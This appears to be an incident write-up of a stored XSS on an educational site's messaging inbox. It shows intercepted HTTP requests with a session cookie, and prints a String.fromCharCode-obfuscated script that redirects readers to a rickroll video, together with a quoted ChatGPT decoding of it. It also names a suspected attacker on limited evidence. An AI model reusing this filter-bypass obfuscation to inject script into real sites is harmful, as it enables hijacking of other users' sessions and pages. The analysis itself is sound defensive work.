## Recently we encountered an attack on a edu.edu.vn.ua's inbox:

![](Pasted%20image%2020250529001736.png)

After attempt to read an inbox - a youtube rickroll page appears:
Origin GET request:
`GET /messages/inbox HTTP/2
Host: edu.edu.vn.ua
Cookie: PHPSESSID=7a8fpt33ckkt74bf937l57gd36
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://edu.edu.vn.ua/course/userlist
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
`

Malicious response:
`GET /xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI HTTP/2
Host: youtu.be
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Full-Version: ""
Sec-Ch-Ua-Arch: ""
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Platform-Version: ""
Sec-Ch-Ua-Model: ""
Sec-Ch-Ua-Bitness: ""
Sec-Ch-Ua-Wow64: ?0
Sec-Ch-Ua-Full-Version-List: 
Sec-Ch-Ua-Form-Factors: 
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://edu.edu.vn.ua/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
`
Via burpsuite, I intercepted malicious get request


![](Pasted%20image%2020250529002114.png)
Also, I can notice, that original edu.edu.vn.ua inbox's page loads normaly until it want's to read all recieved messages.

![](Pasted%20image%2020250529002407.png)

After some HTML analysis, we found a suspicious payload:
![](Pasted%20image%2020250529002633.png)

`const codes = [ 104,116,116,112,115,58,47,47,121,111,117,116,117,46,98,101,47, 120,118,70,90,106,111,53,80,103,71,48,63,115,105,61,102,71,119, 95,75,74,53,89,75,66,108,75,80,121,68,73 ]; window.location.href = String.fromCharCode(...codes);`
From a message with a link https://edu.edu.vn.ua/messages/view/500113

After going to that link, we've found a possible attacker:
[Захаренков Іван Олексійович](https://edu.edu.vn.ua/user/profile/24674)

![](Pasted%20image%2020250529002832.png)


Using ChatGpt:
>Ага, вот он и есть — классический XSS с обходом фильтров через String.fromCharCode:
const codes = [
  104,116,116,112,115,58,47,47,121,111,117,116,117,46,98,101,47,
  120,118,70,90,106,111,53,80,103,71,48,63,115,105,61,102,71,119,
  95,75,74,53,89,75,66,108,75,80,121,68,73
];
window.location.href = String.fromCharCode(...codes);
Это просто "зашифрованный" редирект:
🧠 Декод: https://youtu.be/xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI

we've decoded the payload:
`window.location.href = String.fromCharCode(https://youtu.be/xvFZjo5PgG0?si=fGw_KJ5YKBlKPyDI);`, which is a rickroll

####SO:
Somehow, there is a malicious code, that bypassed XSS filters via ASCII encode/decode method, and that executes as /inbox content loads up. After loading malicious code, it redirects any user to the rickroll